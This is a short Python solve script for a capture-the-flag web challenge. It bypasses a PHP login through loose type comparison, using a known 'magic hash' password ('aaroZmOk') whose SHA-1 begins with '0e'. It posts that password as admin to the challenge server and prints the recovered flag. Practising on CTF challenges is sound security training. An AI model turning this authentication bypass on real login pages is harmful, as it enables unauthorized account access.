#!/usr/bin/env python3
from sqlite3 import *
from hashlib import sha1
import requests, re

REGEX = r"ENO{.*?}"
SITE = "http://52.59.124.14:10022/"
conn = connect('database.db')
c = conn.cursor()

# in php 0e525... is equal to 0 so we have to find another hash which start with 0e
# https://github.com/spaze/hashes/tree/master
password_hash = c.execute("SELECT password FROM users WHERE username = 'admin'").fetchall()[0][0]
password = sha1(b"aaroZmOk").hexdigest()
assert password[:2] == password_hash[:2] # 0e

r = requests.post(SITE + "login.php", data={"username": "admin", "password": "aaroZmOk"})
flag = re.findall(REGEX, r.text)[0]
print(flag) # ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}